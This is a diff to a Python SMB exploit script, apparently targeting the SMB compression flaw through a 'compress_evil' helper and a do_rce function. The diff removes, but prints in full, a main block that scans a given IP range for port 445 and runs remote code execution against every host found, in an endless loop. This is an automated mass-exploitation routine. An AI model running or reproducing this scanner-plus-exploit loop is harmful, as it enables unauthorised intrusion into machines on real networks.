@@ -3,10 +3,7 @@
 import sys
 import socket
 import struct
-import argparse
-import argparse
-import ipaddress
-import termcolor
+
 
 from lznt1 import compress, compress_evil
 from smb_win import smb_negotiate, smb_compress
@@ -440,33 +437,4 @@ def do_rce(ip, port):
 
 
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-ip", help="IP Range. Ex = 192.168.1.0/24", required=True)
-    args = parser.parse_args()
 
-    all_ips = []
-    scanned_ips = []
-    all_ips = ipaddress.ip_network(args.ip)
-
-    while True:
-        scanned_ips.clear()
-        print(termcolor.colored("If the program hangs just wait. It will start automatically.\n\nStarting scan...", 'magenta'))
-        for ip in all_ips:    
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            socket.setdefaulttimeout(0.3)
-            result = s.connect_ex((str(ip), 445))
-            if result ==0:
-                print(f"Found port 445 on {termcolor.colored(ip, 'green')}")
-                scanned_ips.append(ip)
-            s.close()
-        for ip in scanned_ips:
-            try:
-                do_rce(str(ip),445)
-                with open("complete.txt", "wr") as f:
-                    f.write(ip)
-                    f.close()
-                print(f"Successfully exploited {ip}")
-
-            except:
-                print(termcolor.colored(f"Error during exploitation: {ip}", 'red'))
